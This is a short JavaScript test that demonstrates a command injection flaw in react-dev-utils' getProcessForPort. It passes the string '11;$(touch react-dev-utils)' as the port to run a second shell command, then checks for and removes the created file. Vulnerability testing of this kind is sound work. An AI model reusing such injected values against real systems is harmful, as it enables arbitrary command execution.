//https://github.com/facebook/create-react-app/pull/10644
test("Command Injection in react-dev-utils", () => {
  const getProcessForPort = require("react-dev-utils/getProcessForPort");
  const fs = require("fs");
  const path = "./react-dev-utils";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  getProcessForPort("11;$(touch react-dev-utils)");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
